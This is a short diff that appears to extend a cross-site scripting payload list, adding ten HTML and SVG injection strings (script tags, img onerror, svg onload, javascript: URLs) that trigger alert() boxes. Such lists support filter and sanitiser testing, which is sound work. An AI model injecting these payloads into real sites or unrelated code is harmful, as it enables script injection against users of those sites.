@@ -14,4 +14,14 @@
 <embed src="data:image/svg+xml,<svg onload=alert('XSS')>">
 <svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>
 <svg><foreignObject><body onload=alert('XSS')></body></foreignObject></svg>
+<script>alert(1)</script>
+"><script>alert(2)</script>
+<img src=x onerror=alert(3)>
+<svg/onload=alert(4)>
+<iframe src="javascript:alert(5)"></iframe>
+"><img src=x onerror=alert(6)>
+<svg><script>alert(7)</script>
+"><svg/onload=alert(8)>
+<math><mi//xlink:href="javascript:alert(9)">
+<body onload=alert(10)>
 
